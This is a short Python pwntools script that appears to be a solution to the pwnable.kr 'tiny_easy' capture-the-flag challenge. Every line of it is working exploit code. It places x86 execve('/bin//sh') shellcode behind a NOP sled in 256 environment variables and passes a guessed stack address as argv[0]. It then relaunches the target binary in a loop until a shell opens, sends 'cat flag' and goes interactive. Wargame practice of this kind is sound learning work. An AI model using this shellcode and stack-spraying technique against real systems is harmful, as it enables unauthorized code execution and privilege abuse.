from pwn import *

argv = [p32(0xffcc0ce0)]
# argv = ['\xff\xff\xdf\xff']

sc = '\x90'*0x100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

env = {}

for i in range(0x100):
  env[str(i)] = sc
  # argv.append(sc)

# s = ssh('tiny_easy', 'pwnable.kr', 2222, 'guest')
for i in range(0x100):
  p = process(executable='/home/tiny_easy/tiny_easy', argv=argv, env=env)

  try:
    p.sendline('cat flag')
    p.recv(100)
    p.interactive()
  except:
    continue
